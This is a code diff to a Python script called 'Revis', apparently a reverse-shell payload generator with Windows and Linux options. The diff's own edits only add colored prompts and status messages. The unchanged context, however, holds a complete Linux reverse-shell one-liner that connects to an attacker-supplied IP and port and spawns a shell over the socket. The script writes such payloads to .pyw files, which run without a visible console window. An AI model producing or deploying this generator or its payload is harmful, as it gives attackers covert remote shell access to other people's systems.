@@ -4,20 +4,21 @@ import random
 from termcolor import colored
 import subprocess
 import time
-
+import os
 
 def clear_screen():
     subprocess.run(["cls"], shell=True)
 
 
 def windows():
-    print("""
-    R e v i s > Windows Payload
+    clear_screen()
+    print(colored("""
+    R e v i s > Windows Payload Generator
 
 
-        """)
-    ip_addr = input("Enter IP Addr: ")
-    port = int(input("Enter PORT No: "))
+        """, "light_red"))
+    ip_addr = input(colored("Enter IP Addr: ", "light_red"))
+    port = int(input(colored("Enter PORT No: ", "light_red")))
     windows_payload = f"""
 
 import os,socket,subprocess,threading;
@@ -66,8 +67,14 @@ except KeyboardInterrupt:
 
 
 def linux():
-    ip_addr = input("Enter IP address. ")
-    port = int(input("Enter Port No: "))
+    clear_screen()
+    print(colored("""
+    R e v i s > Linux Payload Generator
+
+
+        """, "light_red"))
+    ip_addr = input(colored("Enter IP address: ", "light_red"))
+    port = int(input(colored("Enter Port Number: ", "light_red")))
     linux_payload = f"""
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_addr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
     """
@@ -83,7 +90,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
         name += letters
     with open(f"{name}.pyw", "w") as payload:
         payload.write(linux_payload)
-    print(f"Payload generated: {name}.pyw")
+    print(colored(f"\nPayload: {name}.pyw generated in {os.getcwd()}", "light_red"))
     
 def payloadSelection():
     clear_screen()
@@ -91,7 +98,7 @@ def payloadSelection():
 2) Linux Payload
 
 
-Payload Selection Menu: """, "red"))
+Payload Selection Menu: """, "light_red"))
 
     if choices == "1":
         windows()
